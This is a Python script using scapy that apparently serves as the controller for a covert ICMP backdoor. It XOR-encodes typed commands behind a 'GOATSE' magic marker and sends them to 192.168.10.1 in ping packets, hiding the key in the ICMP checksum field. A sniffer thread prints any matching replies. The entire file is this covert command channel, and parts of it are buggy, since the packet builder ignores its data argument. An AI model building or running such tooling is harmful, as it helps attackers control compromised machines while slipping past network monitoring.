from scapy.all import *
import thread

def generate_key_info():
   return random.randint(0,65535)

def generate_key(key_info):
   key = [0, 0]

   key[0] = key_info & 0xFF
   key[1] = (key_info >> 8) & 0xFF

   return key


def crypt_data(data, key):
   encrypted_data = ""

   if len(data) < 18:
      data += ("\x00" * (len(data) % 18))

   for c in data:
	   encrypted_data += chr((ord(c) ^ key[0]) ^ key[1])

   return encrypted_data

def build_pkt(dst, data, key_info):
   return IP(src='192.168.10.1', dst=dst)/ICMP(type=8, code=0, chksum=key_info)/encrypted_data

def sniff_packet(pkt):
   magic = "GOATSE"

   if pkt[ICMP] and pkt[ICMP].chksum:
      data = crypt_data(pkt.load, generate_key(pkt[ICMP].chksum))

      if data.startswith(magic):
         print data[len(magic) + 1:]

def start_listener():
   sniff(filter="icmp", iface="eth0", prn=sniff_packet, timeout=10)

magic = "GOATSE"

random.seed()

# Create the listener thread
thread.start_new_thread(start_listener, ())

while 1:
   line = sys.stdin.readline().rstrip('\n')
   key_info = generate_key_info()
   key = generate_key(key_info)
   encrypted_data = crypt_data(magic + "\x02" + line, key)

   send(build_pkt("192.168.10.1", encrypted_data, key_info))


